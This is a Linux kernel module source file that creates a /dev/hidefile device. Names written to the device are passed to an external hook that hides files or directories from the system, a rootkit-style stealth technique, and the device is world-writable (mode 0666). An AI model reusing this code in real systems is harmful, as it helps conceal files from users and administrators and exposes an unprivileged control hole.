/*
 * vfs_hook.c - Device node management for file hiding control
 * 与 KernelSU 相同风格
 */

#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>

#include "hook.h"

MODULE_LICENSE("GPL");

/* External functions */
extern int add_hidden_file(const char *name, bool is_dir);

/* Device node */
static bool dev_registered;

static ssize_t hidefile_write(struct file *file, const char __user *buf,
			      size_t count, loff_t *ppos)
{
	char *kbuf;
	char *cmd;
	int ret;

	if (count == 0)
		return 0;

	kbuf = kmalloc(count + 1, GFP_KERNEL);
	if (!kbuf)
		return -ENOMEM;

	if (copy_from_user(kbuf, buf, count)) {
		kfree(kbuf);
		return -EFAULT;
	}
	kbuf[count] = '\0';

	cmd = strim(kbuf);

	if (strcmp(cmd, "clear") == 0) {
		extern void clear_hidden_list(void);
		clear_hidden_list();
		pr_info("hook: all hidden cleared\n");
		kfree(kbuf);
		return count;
	}

	/* Check for directory prefix "d:" */
	if (strncmp(cmd, "d:", 2) == 0) {
		ret = add_hidden_file(cmd + 2, true);
	} else {
		ret = add_hidden_file(cmd, false);
	}

	if (ret == 0)
		pr_info("hook: hidden: %s\n", cmd);
	else if (ret != -EEXIST)
		pr_err("hook: add failed: %d\n", ret);

	kfree(kbuf);
	return count;
}

static ssize_t hidefile_read(struct file *file, char __user *buf,
			     size_t count, loff_t *ppos)
{
	const char *msg = "Usage:\n  echo file > /dev/hidefile\n  echo d:dir > /dev/hidefile\n  echo clear > /dev/hidefile\n";
	size_t len = strlen(msg);

	if (*ppos >= len)
		return 0;

	if (*ppos + count > len)
		count = len - *ppos;

	if (copy_to_user(buf, msg + *ppos, count))
		return -EFAULT;

	*ppos += count;
	return count;
}

static struct file_operations hidefile_fops = {
	.owner = THIS_MODULE,
	.read = hidefile_read,
	.write = hidefile_write,
};

static struct miscdevice hidefile_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "hidefile",
	.fops = &hidefile_fops,
	.mode = 0666,
};

int vfs_hook_init(void)
{
	int ret;

	ret = misc_register(&hidefile_dev);
	if (ret < 0) {
		pr_err("hook: misc_register failed: %d\n", ret);
		return ret;
	}
	dev_registered = true;
	pr_info("hook: /dev/hidefile created\n");

	return 0;
}

void vfs_hook_exit(void)
{
	if (dev_registered) {
		misc_deregister(&hidefile_dev);
		dev_registered = false;
		pr_info("hook: /dev/hidefile removed\n");
	}
}
